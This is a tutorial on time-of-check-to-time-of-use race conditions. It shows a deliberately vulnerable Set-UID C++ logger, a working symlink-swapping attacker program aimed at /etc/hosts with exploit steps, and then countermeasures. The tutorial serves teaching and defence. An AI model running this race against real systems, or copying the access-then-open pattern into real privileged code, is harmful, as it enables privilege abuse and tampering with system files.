# Implementing Race Condition (TOCTOU) in C++

## Introduction

A race condition occurs when the output of a program depends on the timing or sequence of uncontrollable events, such as thread scheduling or process context switches. When a program has a race condition vulnerability, an attacker can run concurrent processes to "race" against the program and alter its intended behavior.

A classic class of race conditions in systems programming is the **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability. This occurs when a program performs a security check (e.g., verifying file permissions) and then uses the resource (e.g., writing to the file) under the assumption that the resource status has not changed between the check and the use.

## The Vulnerable C++ Program

Consider a privileged background service (running with root permissions, such as a Set-UID binary) designed to append user logs to a temporary file `/tmp/app_log.txt`. To prevent the program from accidentally overwriting protected system files, the developer uses the `access()` system call to check if the real user (UID) has write permissions to the file before opening it.

```Cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <cstring>
using namespace std;

int main() {
    const char* filepath = "/tmp/app_log.txt";
    char buffer[100];

    cout << "Enter log entry: ";
    if (!(cin >> ws && cin.getline(buffer, 100))) {
        return 1;
    }

    // TIME OF CHECK (TOC)
    // Check if the real user has write permission on the file
    if (access(filepath, W_OK) == 0) {
        // A context switch can happen here (the TOCTOU window)

        // TIME OF USE (TOU)
        // Open the file and append user data
        ofstream logfile(filepath, ios::app);
        if (logfile.is_open()) {
            logfile << buffer << "\n";
            logfile.close();
            cout << "Log written successfully." << endl;
        }
    } else {
        cout << "Access denied: No write permission." << endl;
    }

    return 0;
}
```

### Vulnerability Analysis

1. **Privileged Access:** Because the program runs as a Set-UID root binary, its effective user ID (EUID) is `0` (root), allowing it to read or write any file on the system.
2. **Access Check:** The `access()` system call checks permissions using the **real user ID (UID)** of the person running the binary, not the EUID. This is intended to ensure a regular user cannot force the root process to write to files they don't own.
3. **File Open:** The C++ `ofstream` constructor uses the effective user ID (EUID = 0) to open the file.
4. **The TOCTOU Window:** A small delay exists between the call to `access()` and the instantiation of `ofstream`. If an attacker can swap the file `/tmp/app_log.txt` with a symbolic link pointing to a protected file (like `/etc/passwd` or `/etc/hosts`) *after* the access check but *before* the file is opened, the root program will write the user's input into the protected system file.

## The Attacking Program

To exploit this vulnerability, an attacker runs a parallel process that rapidly toggles the symbolic link `/tmp/app_log.txt` between a file they own (to pass the `access()` check) and the target system file they want to hijack (to execute the write).

```Cpp
#include <iostream>
#include <unistd.h>
using namespace std;

int main() {
    const char* linkpath = "/tmp/app_log.txt";
    const char* userfile = "/home/user/public_note.txt";
    const char* targetfile = "/etc/hosts";

    while (true) {
        // Point the link to the user-owned file to pass the TOC check
        unlink(linkpath);
        symlink(userfile, linkpath);
        usleep(5000); // 5 milliseconds delay

        // Swap the link to point to the protected target file before the TOU
        unlink(linkpath);
        symlink(targetfile, linkpath);
        usleep(5000);
    }

    return 0;
}
```

### Exploit Sequence

1. The attacker creates `/home/user/public_note.txt` (a file they own).
2. The attacking program loops indefinitely, swapping the symlink `/tmp/app_log.txt` between their own file and `/etc/hosts`.
3. The attacker runs the vulnerable program and inputs a payload (e.g., a dummy domain redirection line).
4. If the timing aligns (the vulnerable program performs the `access()` check while `/tmp/app_log.txt` points to `public_note.txt`, and executes `ofstream` while it points to `/etc/hosts`), the domain redirection is written into `/etc/hosts`.

## Countermeasures

### 1. Atomic File Operations

The safest way to fix TOCTOU issues is to combine the check and the use into a single, atomic system operation. Instead of checking permissions separately, open the file using flags that prevent symlink traversal or ensure exclusive creation.

In Linux, you can use the `O_NOFOLLOW` flag to prevent opening the file if it is a symbolic link:

```Cpp
#include <fcntl.h>
#include <unistd.h>

// Opens the file directly; fails if it is a symbolic link
int fd = open("/tmp/app_log.txt", O_WRONLY | O_APPEND | O_NOFOLLOW);
```

### 2. Privilege De-escalation

Always follow the **Principle of Least Privilege**. In Set-UID programs, temporarily drop effective privileges to the real user ID before opening files, and only escalate to root when performing operations that strictly require it.

```Cpp
uid_t real_uid = getuid();
uid_t eff_uid = geteuid();

// Temporarily drop privileges
seteuid(real_uid);

// Open the file with user privileges
ofstream logfile("/tmp/app_log.txt", ios::app);

// Restore privileges if needed later
seteuid(eff_uid);
```

### 3. File Descriptor Validation

Instead of operating on paths (which can be swapped using symlinks), perform checks directly on the opened file descriptor (`fstat` or `fchown`). Once a file descriptor is opened, its target cannot be swapped by altering the filesystem path.

### 4. OS-Level Protections

Modern operating systems provide built-in protections against symlink attacks in sticky directories like `/tmp`. For example, on Ubuntu, sticky symlink protections can be enabled via:

```bash
sudo sysctl -w kernel.yama.protected_sticky_symlinks=1
```

> **Important:** Never use the `access()` system call to verify permissions before opening a file in a multi-user environment. It inherently introduces a time-of-check to time-of-use vulnerability. Use atomic open flags (`O_CREAT | O_EXCL` or `O_NOFOLLOW`) or temporary privilege de-escalation instead.

## Summary

TOCTOU (Time-of-Check to Time-of-Use) is a common race condition vulnerability that occurs when a system resource's state changes in the time window between validation and access. An attacker can exploit this in Set-UID root binaries by swapping a validated path with a symbolic link pointing to a protected file. Mitigating this risk requires using atomic file operations (such as `O_NOFOLLOW`), applying the principle of least privilege through temporary privilege de-escalation, verifying file descriptors rather than file paths, or enabling sticky symlink protections at the operating system level.




